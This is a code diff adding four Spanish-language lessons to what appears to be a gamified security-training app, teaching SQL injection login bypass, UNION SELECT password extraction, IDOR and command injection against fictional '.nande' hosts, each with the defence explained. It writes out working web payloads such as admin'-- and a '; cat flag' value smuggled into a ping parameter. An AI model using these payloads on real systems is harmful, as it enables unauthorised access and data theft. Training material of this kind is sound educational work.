@@ -295,6 +295,122 @@ export const LESSONS: Lesson[] = [
       },
     ],
   },
+  {
+    id: "l-web-sqli-login",
+    title: "Evadir un login con inyección SQL",
+    level: "intermedio",
+    summary: "Entrar como admin sin la contraseña, contra una base real.",
+    concept:
+      "Si un login arma la consulta pegando tu texto, un comentario SQL (--) puede anular la verificación de la contraseña.",
+    reward: { xp: 160, coins: 120 },
+    steps: [
+      {
+        explain:
+          "El banco del mundo arma la consulta del login concatenando lo que escribís. Mirá cómo responde con datos cualquiera.",
+        task: 'Probá: curl -X POST http://banco.nande/login -d "usuario=rocio&password=malo"',
+        hint: 'curl -X POST http://banco.nande/login -d "usuario=rocio&password=malo"',
+        check: (cmd: string, out: string) =>
+          cmd.includes("banco.nande/login") && /incorrect|error|HTTP/i.test(out),
+        debrief:
+          "Con datos malos no entra. Pero la consulta usa tu texto: si cerrás la comilla del usuario y comentás el resto con --, la contraseña deja de importar.",
+      },
+      {
+        explain:
+          "Como usuario mandá  admin'--  : la comilla cierra la cadena y -- comenta la parte de la contraseña.",
+        task: "Evadí el login como admin con admin'-- de usuario.",
+        hint: `curl -X POST http://banco.nande/login -d "usuario=admin'--&password=x"`,
+        check: (cmd: string, out: string) =>
+          cmd.includes("banco.nande") && /admin/i.test(out) && !/incorrect/i.test(out),
+        debrief:
+          "Entraste como admin sin su contraseña. Defensa: consultas parametrizadas, donde los datos nunca se pegan al SQL.",
+      },
+    ],
+  },
+  {
+    id: "l-web-sqli-union",
+    title: "Robar datos con UNION SELECT",
+    level: "intermedio",
+    summary: "Sacar la tabla de contraseñas por un buscador inyectable.",
+    concept:
+      "UNION pega los resultados de otra consulta a la original: si controlás una consulta, podés leer cualquier tabla.",
+    reward: { xp: 200, coins: 150 },
+    steps: [
+      {
+        explain: "Logueáte como cliente para llegar al buscador de movimientos.",
+        task: 'Entrá: curl -X POST http://banco.nande/login -d "usuario=rocio&password=girasol77"',
+        hint: 'curl -X POST http://banco.nande/login -d "usuario=rocio&password=girasol77"',
+        check: (cmd: string, out: string) =>
+          cmd.includes("banco.nande/login") && /rocio|Saldo|sesi/i.test(out),
+        debrief:
+          "Adentro. El buscador arma otra consulta con tu texto y devuelve 4 columnas: es inyectable con UNION.",
+      },
+      {
+        explain:
+          "La tabla usuarios tiene id, usuario, password, rol, saldo. Cerrá con %' y armá un UNION de 4 columnas.",
+        task: "Sacá las contraseñas con UNION SELECT desde el buscador.",
+        hint: `curl "http://banco.nande/movimientos?q=%25' UNION SELECT id, usuario, password, rol FROM usuarios -- "`,
+        check: (cmd: string, out: string) =>
+          /union\s+select/i.test(cmd) && out.includes("M8arete-2024!"),
+        debrief:
+          "Extrajiste la contraseña del admin de otra tabla. UNION exige el mismo número de columnas (por eso se cuentan con ORDER BY n). Defensa: consultas parametrizadas y permisos mínimos de BD.",
+      },
+    ],
+  },
+  {
+    id: "l-web-idor",
+    title: "Acceder a datos ajenos (IDOR)",
+    level: "intermedio",
+    summary: "Ver el álbum privado de otro cambiando un número.",
+    concept:
+      "Si el servidor no comprueba de quién es un recurso, cambiar el id te da acceso a lo ajeno.",
+    reward: { xp: 140, coins: 100 },
+    steps: [
+      {
+        explain: "Fotos Arandú muestra álbumes por ?id=. Mirá el álbum 1, que es tuyo.",
+        task: "Abrí: curl http://fotos.arandu.nande/album?id=1",
+        hint: "curl http://fotos.arandu.nande/album?id=1",
+        check: (cmd: string) =>
+          cmd.includes("fotos.arandu.nande/album") && cmd.includes("id=1"),
+        debrief: "Te dio el álbum sin comprobar que sea tuyo. ¿Y si probás otros números?",
+      },
+      {
+        explain: "Probá álbumes ajenos. El del admin tiene una bandera.",
+        task: "Encontrá el álbum privado del admin (probá id=7).",
+        hint: "curl http://fotos.arandu.nande/album?id=7",
+        check: (_cmd: string, out: string) => out.includes("ND{idor_album_ajeno}"),
+        debrief:
+          "Leíste un recurso ajeno solo cambiando el id: eso es IDOR. Defensa: verificar que el recurso pertenece a quien lo pide.",
+      },
+    ],
+  },
+  {
+    id: "l-web-cmdi",
+    title: "Inyección de comandos",
+    level: "avanzado",
+    summary: "Ejecutar comandos en el servidor por una utilidad de red.",
+    concept:
+      "Si una web pasa tu texto a un comando de sistema sin filtrar, un ';' encadena tus propios comandos.",
+    reward: { xp: 220, coins: 160 },
+    steps: [
+      {
+        explain: "Herramientas Pytã hace ping a un host que escribís. Probá 127.0.0.1.",
+        task: "curl http://tools.pyta.nande/ping?host=127.0.0.1",
+        hint: "curl http://tools.pyta.nande/ping?host=127.0.0.1",
+        check: (cmd: string, out: string) =>
+          cmd.includes("tools.pyta.nande/ping") && /PING/i.test(out),
+        debrief:
+          "El host va a 'ping -c1 TU_TEXTO'. Si agregás ; y otro comando, se ejecuta también.",
+      },
+      {
+        explain: "Encadená ; cat flag después del host para leer la bandera del servidor.",
+        task: "Leé la bandera con inyección de comandos.",
+        hint: 'curl "http://tools.pyta.nande/ping?host=127.0.0.1; cat flag"',
+        check: (_cmd: string, out: string) => out.includes("ND{cmd_injection_pwned}"),
+        debrief:
+          "Ejecutaste 'cat flag' en el servidor. Defensa: nunca construir comandos con texto del usuario; usar APIs seguras y listas blancas.",
+      },
+    ],
+  },
 ];
 
 /** Motor de lecciones: mantiene el paso actual de la lección activa. */
